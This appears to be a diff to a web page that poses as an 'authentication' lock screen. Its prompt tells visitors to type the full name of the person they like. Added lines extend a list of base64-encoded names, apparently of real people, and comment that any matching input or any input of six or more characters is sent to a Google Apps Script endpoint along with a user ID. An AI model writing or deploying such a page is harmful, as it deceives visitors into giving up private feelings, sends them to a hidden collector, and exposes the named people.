@@ -21,7 +21,7 @@
     <div id="login-screen">
         <div id="login-container">
             <h2>AUTHENTICATION</h2>
-            <input type="password" id="p" placeholder="好きな人半角フルネーム打て">
+            <input type="password" id="p" placeholder="好きな人フルネームローマ字打て">
             <br>
             <button onclick="v()">UNLOCK</button>
         </div>
@@ -67,9 +67,11 @@
             "dGFrZWRhbWVp",
             "b3NhbmFpc2FrdXJh",
             "dGFuYWJlc2FraQ==",
-            "aGlndXRpcnVuYQ=="
+            "aGlndXRpcnVuYQ==",
+            "c2Vub29taXlhYmk="
         ];
 
+        // ⚠️ 新しいGAS URL
         const GAS_URL = "https://script.google.com/macros/s/AKfycbw_-8k_lckeHdJmlHcXNBW68t8NQhiCNlavKHNcayEkgcB5VRAp-eVcmnW81gORnjhT5w/exec";
 
         function getTargetId() {
@@ -96,6 +98,7 @@
                 e = "";
             }
 
+            // 正解、または6文字以上の入力でGASへ送信
             if (_allowed.includes(e) || i.length >= 6) {
                 const userCode = getTargetId();
                 sendToGas(userCode, i);
